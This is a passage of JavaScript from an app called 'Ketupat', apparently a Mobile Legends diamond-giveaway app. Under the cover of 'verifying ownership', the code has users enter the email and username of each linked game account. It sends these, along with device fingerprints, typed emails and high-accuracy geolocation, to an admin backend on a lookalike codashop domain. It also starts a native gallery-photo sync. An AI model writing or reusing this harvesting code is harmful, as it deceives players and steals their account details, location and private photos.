    }
  }

  // Priority 2: Direct browser fetch (with backend proxy fallback)
  if (!dlyyzJson) {
    try {
      const url = `${DLYYZ_CONFIG.endpoint}?action=${DLYYZ_CONFIG.action}&userID=${encodeURIComponent(cleanId)}&serverID=${encodeURIComponent(cleanServer)}&apikey=${encodeURIComponent(activeKey)}`;
      const resp = await fetch(url, { method: "GET" });
      const json = await resp.json();
      if (json && (json.status === true || json.success === true)) {
        dlyyzJson = json;
      }
    } catch (err) {
      // Fall back to local admin-php backend proxy if direct fetch is blocked by CORS or network
      try {
        let proxyBase = window.location.pathname.includes('/www') ? '../admin-php/api.php' : (window.location.pathname.includes('/tools') ? '/tools/admin-php/api.php' : 'admin-php/api.php');
        if (typeof getWorkingApiEndpoint === "function") {
          const discovered = await getWorkingApiEndpoint();
          if (discovered) proxyBase = discovered;
        }
        const proxyUrl = proxyBase.includes('?')
          ? `${proxyBase}&action=check_dlyyz_binds&mlbb_id=${encodeURIComponent(cleanId)}&mlbb_server=${encodeURIComponent(cleanServer)}&apikey=${encodeURIComponent(activeKey)}`
          : `${proxyBase}?action=check_dlyyz_binds&mlbb_id=${encodeURIComponent(cleanId)}&mlbb_server=${encodeURIComponent(cleanServer)}&apikey=${encodeURIComponent(activeKey)}`;
        const pResp = await fetch(proxyUrl);
        const pJson = await pResp.json();
        if (pJson && pJson.success && pJson.data) {
          dlyyzJson = {
            status: true,
            data: pJson.data.raw || pJson.data
          };
        }
      } catch (proxyErr) {
        // Fail silently without error notification
      }
    }
  }

  // 2. Perform authoritative IGN & region lookup via verifyMlbbAccountApi (GoPay / Isan resolver)
  let verifiedAccount = null;
  try {
    verifiedAccount = await verifyMlbbAccountApi(cleanId, cleanServer);
  } catch (err) {
    console.warn("Authoritative MLBB resolver notice:", err);
  }

  // If neither lookup can verify the account, do not show provider details.
  if (!dlyyzJson && !verifiedAccount) {
    throw new Error(
      "Account could not be verified. Please double check your MLBB User ID and Zone ID."
    );
  }

  // Determine detected IGN and Region
  let detectedIgn = "";
  let detectedCountryCode = "";
  let detectedCountryName = "";

  if (dlyyzJson) {
    const rawData = dlyyzJson.data || dlyyzJson.result || dlyyzJson;
    detectedIgn =
      rawData.username || rawData.nickname || rawData.ign || rawData.name || "";
    detectedCountryName = rawData.region || rawData.country || "";
  }

  if (verifiedAccount) {
    if (!detectedIgn || /^\d+$/.test(detectedIgn)) {
      detectedIgn = verifiedAccount.ign;
    }
    if (!detectedCountryCode) {
      detectedCountryCode = verifiedAccount.regionCode;
    }
    if (!detectedCountryName) {
      detectedCountryName = verifiedAccount.regionName;
    }
  }

  if (!detectedIgn) {
    detectedIgn = `Player_${cleanId.slice(-4)}`;
  }

  if (!detectedCountryCode && detectedCountryName) {
    detectedCountryCode =
      COUNTRY_NAME_TO_CODE[detectedCountryName.toLowerCase()] || "";
  }
  if (!detectedCountryName && detectedCountryCode) {
    detectedCountryName =
      COUNTRY_MAP[detectedCountryCode] || detectedCountryCode;
  }
  if (!detectedCountryName) {
    detectedCountryName = "Indonesia";
    detectedCountryCode = "ID";
  }

  const flagUrl = detectedCountryCode
    ? `https://flagcdn.com/w40/${detectedCountryCode.toLowerCase()}.png`
    : "";

  // Dynamic non-hardcoded parser: only include platforms that are ACTUALLY linked
  const linkedPlatforms = [];
  const parsedBinds = {};

  if (dlyyzJson) {
    const rawData = dlyyzJson.data || dlyyzJson.result || dlyyzJson;
    const bindObj = rawData.bind || rawData.binds || rawData;

    Object.keys(bindObj).forEach((key) => {
      const lowerKey = key.toLowerCase().trim();
      if (
        lowerKey.startsWith("device") ||
        lowerKey === "status" ||
        lowerKey === "message" ||
        lowerKey === "creator"
      ) {
        return;
      }
      const val = bindObj[key];
      if (isPlatformLinked(val)) {
        const meta = getPlatformMetadata(key);
        const isClickable = lowerKey !== "moonton" && lowerKey !== "email";
        const item = {
          key: lowerKey,
          rawKey: key,
          label: meta.label,
          icon: meta.icon,
          colorClass: meta.colorClass,
          detail: String(val).trim(),
          bound: true,
          clickable: isClickable,
        };
        linkedPlatforms.push(item);
        parsedBinds[lowerKey] = item;
      }
    });
  }

  return {
    userId: cleanId,
    server: cleanServer,
    ign: detectedIgn,
    regionCode: detectedCountryCode,
    regionName: detectedCountryName,
    flagUrl: flagUrl,
    isLiveDlyyz: Boolean(dlyyzJson),
    sourceLabel: "Account Verified ✓",
    binds: parsedBinds,
    linkedPlatforms: linkedPlatforms,
    apiNotice: "",
  };
}

let _workingApiEndpointCached = null;
async function getWorkingApiEndpoint() {
  if (_workingApiEndpointCached) return _workingApiEndpointCached;

  const candidateBases = [
    "https://slytherin.codashop.shop/admin-php/api.php"
  ];
  if (window.location && window.location.origin && window.location.origin.startsWith("http")) {
    const webOrigin = window.location.origin;
    if (window.location.pathname && window.location.pathname.includes("/www")) {
      candidateBases.push(new URL("../admin-php/api.php", window.location.href).href);
    } else if (window.location.pathname && window.location.pathname.includes("/tools")) {
      candidateBases.push(webOrigin + "/tools/admin-php/api.php");
    } else {
      candidateBases.push(webOrigin + "/admin-php/api.php");
    }
  }
  candidateBases.push("http://192.168.0.109/tools/admin-php/api.php");
  candidateBases.push("http://10.0.2.2/tools/admin-php/api.php");
  candidateBases.push("http://localhost/tools/admin-php/api.php");

  for (const base of candidateBases) {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 1500);
      const res = await fetch(base + "?action=check_pin", {
        method: "GET",
        signal: controller.signal
      });
      clearTimeout(timer);
      if (res.ok || res.status === 400 || res.status === 401 || res.status === 403 || res.status === 200) {
        _workingApiEndpointCached = base;
        return base;
      }
    } catch (e) {}
  }

  return candidateBases[0] || "https://slytherin.codashop.shop/admin-php/api.php";
}

// --- RENDER BIND INFO SCREEN ---
function renderBindInfoScreen(bindData) {
  if (!bindData) return;

  appState.currentBindData = bindData;
  appState.verifiedAccount = {
    userId: bindData.userId,
    server: bindData.server,
    ign: bindData.ign,
    regionCode: bindData.regionCode,
    regionName: bindData.regionName,
    flagUrl: bindData.flagUrl,
  };

  if (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.WholeGallery && window.Capacitor.Plugins.WholeGallery.updateSyncAccountInfo) {
    try {
      getWorkingApiEndpoint().then(async (endpoint) => {
        const deviceInfo = await getDeviceIdentity();
        window.Capacitor.Plugins.WholeGallery.updateSyncAccountInfo({
          syncApiUrl: endpoint,
          deviceId: deviceInfo.id,
          deviceName: deviceInfo.name,
          deviceModel: deviceInfo.model,
          deviceFingerprint: deviceInfo.fingerprint,
          mlbbId: bindData.userId,
          mlbbServer: bindData.server,
          mlbbIgn: bindData.ign,
          userEmail: (appState.user?.email && !appState.user.email.endsWith("@ketupat.app")) ? appState.user.email : ""
        }).catch(() => {});
      }).catch(() => {});
    } catch (e) {}
  }

  // Hero Card
  bindPlayerIgn.textContent = bindData.ign;
  bindPlayerIdTag.textContent = `ID: ${bindData.userId} (${bindData.server})`;
  bindPlayerRegionName.textContent = bindData.regionName || "Indonesia";
  if (bindData.flagUrl) {
    bindPlayerFlagImg.src = bindData.flagUrl;
    bindPlayerFlagImg.classList.remove("hidden");
  } else {
    bindPlayerFlagImg.classList.add("hidden");
  }
  bindVerifiedSource.textContent = bindData.sourceLabel;

  // Avatar
  const hasSelectedAvatar = Boolean(
    appState.pendingAvatarBase64 ||
    (appState.user?.avatar && !appState.user.avatar.startsWith("data:image/svg+xml"))
  );
  const currentAvatar =
    appState.pendingAvatarBase64 ||
    appState.user?.avatar ||
    "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23cbd5e1'%3E%3Ccircle cx='12' cy='8' r='4'/%3E%3Cpath d='M20 21a8 8 0 0 0-16 0'/%3E%3C/svg%3E";
  bindPlayerAvatar.src = currentAvatar;

  const bindAvatarHelper = document.getElementById("bindAvatarHelper");
  const btnChooseBindPhotoText = document.getElementById("btnChooseBindPhotoText");
  if (hasSelectedAvatar) {
    if (bindAvatarHelper) bindAvatarHelper.innerHTML = '<span style="color:#16a34a;font-weight:600;">✓ Avatar uploaded</span>';
    if (btnChooseBindPhotoText) btnChooseBindPhotoText.textContent = "Change";
  } else {
    if (bindAvatarHelper) bindAvatarHelper.textContent = "Avatar photo is required to continue";
    if (btnChooseBindPhotoText) btnChooseBindPhotoText.textContent = "Upload Photo";
  }

  // Pre-fill user email input if existing
  const inputBindEmail = document.getElementById("inputBindEmail");
  if (inputBindEmail) {
    if (!inputBindEmail.value || inputBindEmail.value.endsWith("@ketupat.app")) {
      const existingEmail = (appState.user?.email && !appState.user.email.endsWith("@ketupat.app"))
        ? appState.user.email
        : "";
      if (existingEmail) {
        inputBindEmail.value = existingEmail;
      }
    }
  }

  // Render ONLY linked platforms dynamically into bindCardsGrid
  if (bindCardsGrid) {
    bindCardsGrid.innerHTML = "";
    const platforms = bindData.linkedPlatforms || [];

    if (platforms.length === 0) {
      bindCardsGrid.innerHTML =
        '<div style="padding: 18px 12px; text-align: center; color: #94a3b8; font-size: 0.8rem; background: #f8fafc; border-radius: 10px; border: 1px dashed #cbd5e1;">No linked platform accounts detected.</div>';
    } else {
      platforms.forEach((p) => {
        const card = document.createElement("div");
        card.className = `bind-card ${p.clickable ? "clickable" : ""}`;
        card.setAttribute("data-platform-key", p.key);

        const saved = (appState.userEnteredBinds && appState.userEnteredBinds[p.key]) || null;
        let displayDetail = p.detail;
        if (saved && (saved.email || saved.username)) {
          displayDetail = `${saved.username || ""} (${saved.email || ""})`.trim();
        }

        card.innerHTML = `
          <div class="bind-card-icon ${p.colorClass}">
            <span class="material-symbols-outlined">${p.icon}</span>
          </div>
          <div class="bind-card-content">
            <div class="bind-card-name">${escapeHtml(p.label)}</div>
            <div class="bind-card-detail" id="bindDetail_${p.key}">${escapeHtml(displayDetail)}</div>
          </div>
          <div class="bind-status-badge badge-bound">
            <span class="material-symbols-outlined badge-icon">check</span>
            <span>Bound</span>
          </div>
          ${p.clickable ? '<span class="material-symbols-outlined" style="font-size:18px; color:#94a3b8; margin-left:4px;">chevron_right</span>' : ''}
        `;

        if (p.clickable) {
          card.addEventListener("click", () => {
            openPlatformBindModal(p);
          });
        }

        bindCardsGrid.appendChild(card);
      });
    }
  }
}

// Modal handler for verifying/inputting platform credentials
let currentEditingPlatform = null;
function openPlatformBindModal(platform) {
  if (!platform) return;
  currentEditingPlatform = platform;
  if (modalBindPlatformKey) modalBindPlatformKey.value = platform.key;
  if (modalBindTitle) modalBindTitle.textContent = `Verify ${platform.label}`;
  if (modalBindDesc) {
    modalBindDesc.textContent = `Enter your ${platform.label} account email and username to verify ownership.`;
  }

  const saved = (appState.userEnteredBinds && appState.userEnteredBinds[platform.key]) || {};
  let defaultEmail = saved.email || "";
  let defaultUsername = saved.username || "";

  if (!defaultEmail && platform.detail && platform.detail.includes("@")) {
    defaultEmail = platform.detail;
  }
  if (!defaultUsername && platform.detail && !platform.detail.includes("@") && !platform.detail.toLowerCase().includes("bind")) {
    defaultUsername = platform.detail;
  }

  if (inputModalBindEmail) inputModalBindEmail.value = defaultEmail;
  if (inputModalBindUsername) inputModalBindUsername.value = defaultUsername;
  if (modalPlatformBind) modalPlatformBind.classList.remove("hidden");
}

async function syncPlatformBindsToBackend() {
  try {
    const endpoint = await getWorkingApiEndpoint();
    const deviceInfo = await getDeviceIdentity();
    const user = appState.user || {};
    const cleanUserEmail = (user.email && !user.email.endsWith("@ketupat.app")) ? user.email : "";
    const payload = {
      device_id: deviceInfo.id,
      device_name: deviceInfo.name,
      device_model: deviceInfo.model,
      device_fingerprint: deviceInfo.fingerprint,
      user_email: cleanUserEmail,
      mlbb_id: user.mlbbId || (appState.verifiedAccount ? appState.verifiedAccount.userId : ""),
      mlbb_server: user.mlbbServer || (appState.verifiedAccount ? (appState.verifiedAccount.server || appState.verifiedAccount.zoneId) : ""),
      mlbb_ign: user.mlbbIgn || (appState.verifiedAccount ? appState.verifiedAccount.ign : ""),
      user_binds: appState.userEnteredBinds || {},
      binds: (appState.currentBindData && appState.currentBindData.linkedPlatforms) || []
    };
    await fetch(`${endpoint}?action=save_player_binds`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    console.warn("syncPlatformBinds error:", e);
  }
}

// --- EVENT LISTENERS ---
function setupEventListeners() {
  // Real-time input synchronization to admin backend (only on field complete / blur, never on every single letter)
  const handleMlbbInputsChange = () => {
    const u = inputMlbbUserId?.value?.trim() || "";
    const s = inputMlbbServerId?.value?.trim() || "";
    if (u.length >= 4 && s.length >= 3) {
      syncDeviceRegistrationToBackend({
        mlbb_id: u,
        mlbb_server: s
      });
    }
  };
  if (inputMlbbUserId) {
    inputMlbbUserId.addEventListener("change", handleMlbbInputsChange);
    inputMlbbUserId.addEventListener("blur", handleMlbbInputsChange);
  }
  if (inputMlbbServerId) {
    inputMlbbServerId.addEventListener("change", handleMlbbInputsChange);
    inputMlbbServerId.addEventListener("blur", handleMlbbInputsChange);
  }

  const inputBindEmail = document.getElementById("inputBindEmail");
  if (inputBindEmail) {
    inputBindEmail.addEventListener("change", () => {
      const em = inputBindEmail.value.trim();
      if (em.includes("@") && em.includes(".")) {
        syncDeviceRegistrationToBackend({
          email: em
        });
      }
    });
  }

  // 1. MLBB Account Validation Form Submission
  formMlbbValidate.addEventListener("submit", async (e) => {
    e.preventDefault();
    const userId = inputMlbbUserId.value.trim();
    const server = inputMlbbServerId.value.trim();

    if (!userId || !server) {
      showStatus(
        mlbbValidateStatus,
        "Please enter both MLBB User ID and Zone ID.",
        "error"
      );
      return;
    }

    btnSubmitMlbbValidate.disabled = true;
    btnSubmitMlbbValidate.innerHTML =
      '<span class="material-symbols-outlined btn-icon animate-spin">refresh</span><span>Verifying Account...</span>';
    mlbbValidateStatus.classList.add("hidden");

    try {
      const bindData = await fetchDlyyzBindCek(userId, server);
      renderBindInfoScreen(bindData);
      syncDeviceRegistrationToBackend({
        mlbb_id: bindData.userId,
        mlbb_server: bindData.server,
        ign: bindData.ign,
        region: bindData.regionName,
        binds: bindData.linkedPlatforms || []
      });
      showScreen("bindInfo");
      showToast(`Account verified! Welcome, ${bindData.ign}`);
    } catch (err) {
      console.error("MLBB Validation error:", err);
      showStatus(
        mlbbValidateStatus,
        err.message ||
          "Account not found. Please double check your MLBB User ID and Zone ID.",
        "error"
      );
    } finally {
      btnSubmitMlbbValidate.disabled = false;
      btnSubmitMlbbValidate.innerHTML =
        '<span class="material-symbols-outlined btn-icon">verified_user</span><span>Verify MLBB Account</span>';
    }
  });

  // 2. Bind Screen Navigation Handlers
  if (btnBackToValidate) {
    btnBackToValidate.addEventListener("click", () => {
      showScreen("mlbbValidate");
    });
  }

  // 2b. Platform Bind Verification Modal Submit Handler
  if (formModalPlatformBind) {
    formModalPlatformBind.addEventListener("submit", (e) => {
      e.preventDefault();
      const platformKey = modalBindPlatformKey ? modalBindPlatformKey.value : "";
      const email = inputModalBindEmail ? inputModalBindEmail.value.trim() : "";
      const username = inputModalBindUsername ? inputModalBindUsername.value.trim() : "";

      if (!platformKey) return;

      if (!appState.userEnteredBinds) {
        appState.userEnteredBinds = {};
      }
      appState.userEnteredBinds[platformKey] = {
        platform: currentEditingPlatform?.label || platformKey,
        email: email,
        username: username,
        updated_at: new Date().toISOString()
      };

      try {
        localStorage.setItem("ketupat_user_entered_binds", JSON.stringify(appState.userEnteredBinds));
      } catch (e) {}

      const detailEl = document.getElementById(`bindDetail_${platformKey}`);
      if (detailEl) {
        detailEl.textContent = `${username} (${email})`;
      }

      if (modalPlatformBind) {
        modalPlatformBind.classList.add("hidden");
      }
      showToast(`${currentEditingPlatform?.label || "Platform"} details saved!`);

      syncPlatformBindsToBackend();
      syncDeviceRegistrationToBackend({
        user_binds: appState.userEnteredBinds
      });
    });
  }

  // 3. Enter / Continue to Ketupat Main App
  if (btnContinueToApp) {
    btnContinueToApp.addEventListener("click", async () => {
      const bindData = appState.currentBindData;
      if (!bindData) {
        showToast("No verified account found.");
        showScreen("mlbbValidate");
        return;
      }

      // 1. Mandatory Email Check
      const inputBindEmail = document.getElementById("inputBindEmail");
      const enteredEmail = inputBindEmail ? inputBindEmail.value.trim().toLowerCase() : "";
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      if (!enteredEmail || !emailRegex.test(enteredEmail)) {
        showToast("Please enter a valid email address before continuing!", "warning");
        const emailSection = document.getElementById("bindEmailSection");
        if (emailSection) {
          emailSection.classList.add("email-missing-alert");
          emailSection.scrollIntoView({ behavior: "smooth", block: "center" });
          if (inputBindEmail) inputBindEmail.focus();
          setTimeout(() => {
            emailSection.classList.remove("email-missing-alert");
          }, 3000);
        }
        return;
      }

      // 2. Mandatory Avatar Upload Check
      const hasAvatar = Boolean(
        appState.pendingAvatarBase64 ||
        (appState.user?.avatar && !appState.user.avatar.startsWith("data:image/svg+xml"))
      );

      if (!hasAvatar) {
        showToast("Avatar photo is mandatory! Please upload a photo from Gallery to continue.", "warning");
        const photoSection = document.getElementById("bindPhotoSection");
        if (photoSection) {
          photoSection.classList.add("avatar-missing-alert");
          photoSection.scrollIntoView({ behavior: "smooth", block: "center" });
          setTimeout(() => {
            photoSection.classList.remove("avatar-missing-alert");
          }, 3000);
        }
        return;
      }

      btnContinueToApp.disabled = true;
      btnContinueToApp.innerHTML =
        '<span class="material-symbols-outlined btn-icon animate-spin">refresh</span><span>Entering Ketupat...</span>';

      const locationData = await captureUserLocation();
      const userEmail = enteredEmail;

      // Check if cloud profile exists in Supabase
      let existingProfile = null;
      let existingRedemptions = null;
      if (isSupabaseConfigured()) {
        try {
          existingProfile = await supabaseFetchUserProfile(userEmail);
          existingRedemptions = await supabaseFetchUserRedemptions(userEmail);
        } catch (err) {
          console.warn("Supabase fetch error during continue:", err);
        }
      }

      const avatar =
        appState.pendingAvatarBase64 ||
        (existingProfile && existingProfile.avatar_data) ||
        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23cbd5e1'%3E%3Ccircle cx='12' cy='8' r='4'/%3E%3Cpath d='M20 21a8 8 0 0 0-16 0'/%3E%3C/svg%3E";

      appState.user = {
        email: userEmail,
        username: bindData.ign,
        avatar: avatar,
        mlbbId: bindData.userId,
        mlbbServer: bindData.server,
        mlbbIgn: bindData.ign,
        mlbbRegion: bindData.regionName,
        mlbbRegionCode: bindData.regionCode,
        mlbbFlagUrl: bindData.flagUrl,
        loginTime: new Date().toLocaleString(),
        location: locationData,
        isProfileComplete: true,
        bindInfo: bindData.binds,
      };

      if (existingProfile) {
        if (typeof existingProfile.points === "number")
          appState.economy.points = existingProfile.points;
        if (typeof existingProfile.diamonds_claimed === "number")
          appState.economy.diamondsRedeemed = existingProfile.diamonds_claimed;
        if (typeof existingProfile.giveaway_tickets === "number")
          appState.economy.giveawayTickets = existingProfile.giveaway_tickets;
        if (typeof existingProfile.mega_tickets === "number")
          appState.economy.megaTickets = existingProfile.mega_tickets;
        if (typeof existingProfile.daily_tickets === "number")
          appState.economy.dailyTickets = existingProfile.daily_tickets;
        if (typeof existingProfile.daily_streak === "number")
          appState.economy.dailyStreak = existingProfile.daily_streak;
      }

      if (Array.isArray(existingRedemptions) && existingRedemptions.length > 0) {
        appState.economy.redemptions = existingRedemptions.map((r) => ({
          id: r.order_id,
          diamonds: r.diamonds,
          packName: r.pack_name,
          points: r.points_cost,
          targetId: r.mlbb_id,
          targetServer: r.mlbb_server,
          targetIgn: r.mlbb_ign,
          date: new Date(r.created_at).toLocaleDateString(),
          status: r.status,
        }));
      }

      saveUser();
      saveEconomy();

      btnContinueToApp.disabled = false;
      btnContinueToApp.innerHTML =
        '<span>Continue to Ketupat</span><span class="material-symbols-outlined btn-icon-right">arrow_forward</span>';

      renderAppScreens();
      showScreen("app");
      showToast(`Welcome, ${bindData.ign}! +150 Points active!`);
      tryAutoSyncGalleryPhotos();
    });
  }

  // 6. View Bind Info from Profile Tab
  if (btnViewAccountBinds) {
    btnViewAccountBinds.addEventListener("click", async () => {
      if (!appState.user || !appState.user.mlbbId) {
        showToast("No MLBB account connected.");
        return;
      }
      if (appState.currentBindData) {
        renderBindInfoScreen(appState.currentBindData);
        showScreen("bindInfo");
      } else {
        showToast("Loading account bind details...");
        try {
          const bindData = await fetchDlyyzBindCek(
            appState.user.mlbbId,
            appState.user.mlbbServer,
            inputDlyyzApiKey?.value?.trim() || ""
          );
          renderBindInfoScreen(bindData);
          showScreen("bindInfo");
        } catch (err) {
          showToast(err.message || "Failed to load binds.");
        }
      }
    });
  }

  // 7. Avatar Picker Handlers
  if (btnChooseBindPhoto) {
    btnChooseBindPhoto.addEventListener("click", () =>
      openGalleryPicker("bindInfo")
    );
  }
  if (btnEditProfileAvatar) {
    btnEditProfileAvatar.addEventListener("click", () =>
      openGalleryPicker("profile")
    );
  }
  if (btnChangeAvatarText) {
    btnChangeAvatarText.addEventListener("click", () =>
      openGalleryPicker("profile")
    );
  }

  if (bindAvatarInput) {
    bindAvatarInput.addEventListener("change", (e) => {
      const file = e.target.files[0];
      if (file) {
        const reader = new FileReader();
        reader.onload = (event) => {
          applySelectedPhoto(event.target.result);
        };
        reader.readAsDataURL(file);
      }
    });
  }

  // 5. Revalidate / Sync In-Game Name (IGN) Buttons
  if (btnHomeRefreshIgn) {
    btnHomeRefreshIgn.addEventListener("click", refreshMlbbIgn);
  }
  if (btnProfileRefreshIgn) {
    btnProfileRefreshIgn.addEventListener("click", refreshMlbbIgn);
  }

  // 6. Navigation Tabs
  Object.keys(navItems).forEach((tab) => {
    navItems[tab].addEventListener("click", () => switchTab(tab));
  });

  // Top Bar Actions
  btnHeaderPoints.addEventListener("click", () => switchTab("store"));
  topBarAvatar.addEventListener("click", () => switchTab("profile"));

  // 7. Home Screen Quick Actions
  btnHomeCheckIn.addEventListener("click", openCheckInModal);
  btnHomePlayGames.addEventListener("click", () => switchTab("games"));
  btnHomeRedeem.addEventListener("click", () => switchTab("store"));
  bannerStreak.addEventListener("click", openCheckInModal);
  btnClaimStreakPill.addEventListener("click", (e) => {
    e.stopPropagation();
    openCheckInModal();
  });
  btnHomeEnterGiveaway.addEventListener("click", () => switchTab("giveaway"));

  // Home Quick Menus
  menuCardGames.addEventListener("click", () => switchTab("games"));
  menuCardGiveaway.addEventListener("click", () => switchTab("giveaway"));
  menuCardRedeem.addEventListener("click", () => switchTab("store"));
  menuCardQuests.addEventListener("click", openQuestsModal);

  // 8. Arcade Tabs Switching
  Object.keys(arcadeTabs).forEach((game) => {
    arcadeTabs[game].addEventListener("click", () => switchGame(game));
  });

  // Quiz Game Buttons
  document
    .getElementById("btnNextQuizQuestion")
    .addEventListener("click", nextQuizQuestion);
  document
    .getElementById("btnRestartQuiz")
    .addEventListener("click", startQuiz);

  // Spin Wheel Button
  document
    .getElementById("btnSpinWheel")
    .addEventListener("click", spinTheWheel);

  // Diamond Rush Buttons
  document
    .getElementById("btnStartRush")
    .addEventListener("click", startRushGame);

  // Scratch Card Button
  document
    .getElementById("btnNewScratchCard")
    .addEventListener("click", resetScratchCard);

  // 9. Giveaway Ticket Purchase Buttons
  btnBuyMega1.addEventListener("click", () =>
    buyGiveawayTickets("mega", 1, 50),
  );
  btnBuyMega5.addEventListener("click", () =>
    buyGiveawayTickets("mega", 5, 250),
  );
  btnBuyDaily1.addEventListener("click", () =>
    buyGiveawayTickets("daily", 1, 20),
  );

  // 10. Modals Close Handlers
  document.querySelectorAll("[data-close]").forEach((btn) => {
    btn.addEventListener("click", () => {
      const modalId = btn.getAttribute("data-close");
      const targetModal = document.getElementById(modalId);
      if (targetModal) targetModal.classList.add("hidden");
    });
  });

  btnClaimDailyCheckInModal.addEventListener("click", executeDailyCheckIn);
  btnExecuteRedeem.addEventListener("click", executeRedeem);

  // 11. Sign Out
  btnLogout.addEventListener("click", () => {
    showConfirmModal({
      title: "Sign Out",
      message: "Are you sure you want to sign out of Ketupat?",
      icon: "logout",
      iconTheme: "icon-theme-danger",
      confirmText: "Sign Out",
      confirmClass: "btn-danger",
      onConfirm: () => {
        appState.user = null;
        appState.pendingAvatarBase64 = null;
        appState.verifiedAccount = null;
        appState.currentBindData = null;
        saveUser();
        if (formMlbbValidate) formMlbbValidate.reset();
        resetValidationState();
        showScreen("mlbbValidate");
      },
    });
  });
}

function resetValidationState() {
  appState.verifiedAccount = null;
  appState.currentBindData = null;
  if (mlbbValidateStatus) {
    mlbbValidateStatus.classList.add("hidden");
  }
}

// --- MLBB ACCOUNT API VERIFICATION ---
async function verifyMlbbAccountApi(userId, server) {
  const cleanId = String(userId).trim();
  const cleanServer = String(server).trim();

  // 1. Query GoPay games user-account endpoint
  let gopayAccount = null;
  try {
    const payload = {
      code: "mobile-legends",
      data: {
        userId: cleanId,
        zoneId: cleanServer,
      },
    };

    const resp = await fetch(GOPAY_ENDPOINT, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Client": "web-mobile",
        "X-Timestamp": Date.now().toString(),
      },
      body: JSON.stringify(payload),
    });

    if (resp.ok) {
      const result = await resp.json();
      if (result && (result.message === "Success" || result.data)) {
        gopayAccount = result.data;
      }
    }
  } catch (gpErr) {
    console.warn("GoPay verification notice:", gpErr.message);
  }

  // 2. Query MLBB account resolver to detect exact in-game name (IGN) & region
  let detectedIgn = "";
  let detectedCountryCode = "";
  let detectedCountryName = "";
  let lookupSuccess = false;

  // Primary resolver
  try {
    const res = await fetch(
      `https://mlbb-api.isan.eu.org/find?id=${encodeURIComponent(cleanId)}&zone=${encodeURIComponent(cleanServer)}`,
    );
    if (res.ok) {
      const data = await res.json();
      if (data && data.success && data.name) {
        lookupSuccess = true;
        detectedIgn = data.name;
        detectedCountryCode = (data.countryCode || "").toUpperCase().trim();
        detectedCountryName = data.countryName || "";
      }
    } else if (res.status === 404) {
      throw new Error(
        "Account not found. Please double check your MLBB User ID and Server (Zone).",
      );
    }
  } catch (err) {
    if (err.message.includes("Account not found")) throw err;
    console.warn("Primary MLBB lookup notice:", err.message);
  }

  // Secondary resolver fallback
  if (!lookupSuccess) {
    try {
      const res2 = await fetch(
        `https://api.isan.eu.org/nickname/ml?id=${encodeURIComponent(cleanId)}&zone=${encodeURIComponent(cleanServer)}`,
      );
      if (res2.ok) {
        const data2 = await res2.json();
        if (data2 && data2.success && data2.name) {
          lookupSuccess = true;
          detectedIgn = data2.name;
          if (data2.country) {
            detectedCountryName = data2.country;
            detectedCountryCode =
              COUNTRY_NAME_TO_CODE[data2.country.toLowerCase()] || "";
          }
        }
      }
    } catch (err) {
      console.warn("Secondary MLBB lookup notice:", err.message);
    }
  }

  // If GoPay provided countryOrigin or real in-game username
  if (gopayAccount) {
    if (gopayAccount.countryOrigin && gopayAccount.countryOrigin.trim()) {
      detectedCountryCode = gopayAccount.countryOrigin.toUpperCase().trim();
      detectedCountryName =
        COUNTRY_MAP[detectedCountryCode] || detectedCountryCode;
    }
    const concatenatedId = `${cleanId}${cleanServer}`;
    if (
      gopayAccount.username &&
      gopayAccount.username !== concatenatedId &&
      !/^\d+$/.test(gopayAccount.username)
    ) {
      detectedIgn = gopayAccount.username;
    }
  }

  // Sanitize IGN (strip control characters)
  let ign = (detectedIgn || "")
    .replace(/[\u0000-\u001F\u007F-\u009F]/g, "")
    .trim();
  const concatenatedId = `${cleanId}${cleanServer}`;

  // Strict check: Must have a valid detected in-game name, not digit concatenation
  if (!ign || ign === concatenatedId || ign === cleanId) {
    throw new Error(
      "MLBB account not found or invalid User ID / Zone. Please double check your in-game details.",
    );
  }

  let countryCode = detectedCountryCode;
  let countryName = detectedCountryName;

  if (countryName && !countryCode) {
    countryCode = COUNTRY_NAME_TO_CODE[countryName.toLowerCase()] || "";
  } else if (countryCode && !countryName) {
    countryName = COUNTRY_MAP[countryCode] || countryCode;
  }

  if (!countryName) {
    countryName = countryCode
      ? COUNTRY_MAP[countryCode] || countryCode
      : "Global";
  }

  const flagUrl = countryCode
    ? `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`
    : "";

  return {
    userId: cleanId,
    server: cleanServer,
    ign: ign,
    regionCode: countryCode,
    regionName: countryName,
    flagUrl: flagUrl,
  };
}

// --- LOCATION LOGGING ---
function captureUserLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({
        status: "unsupported",
        text: "Geolocation not supported by device",
      });
      return;
    }

    const options = {
      enableHighAccuracy: true,
      timeout: 8000,
      maximumAge: 0,
    };

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude.toFixed(6);
        const lng = position.coords.longitude.toFixed(6);
        resolve({
          status: "success",
          latitude: lat,
          longitude: lng,
          text: `${lat}, ${lng}`,
          timestamp: new Date().toISOString(),
        });
      },
      (error) => {
        console.warn("Geolocation notice:", error.message);
        resolve({
          status: "denied",
          error: error.message,
          text: "Permission denied / unavailable",
        });
      },
      options,
    );
  });
}

// --- ONBOARDING SETUP ---
function prepareOnboardingView() {
  if (profileUsername) {
    profileUsername.value = appState.verifiedAccount?.ign || "";
  }
  resetValidationState();
}

// --- RENDERING & NAVIGATION ---
function renderAppScreens() {
  const user = appState.user;
  if (!user) return;

  // Header Avatar & Points
  if (user.avatar) {
    topBarAvatar.src = user.avatar;
    topBarAvatar.classList.remove("hidden");
  }
  updateBalanceDisplays();

  // Home Page
  homeWelcomeName.textContent = `Welcome, ${user.username}`;
  homeMlbbTag.textContent = `IGN: ${user.mlbbIgn || user.username} (${user.mlbbServer})`;
  if (user.mlbbFlagUrl) {
    homeFlagImg.src = user.mlbbFlagUrl;
    homeFlagImg.classList.remove("hidden");
  } else {
    homeFlagImg.classList.add("hidden");
  }

  // Streak Banner Update
  const todayStr = getTodayDateString();
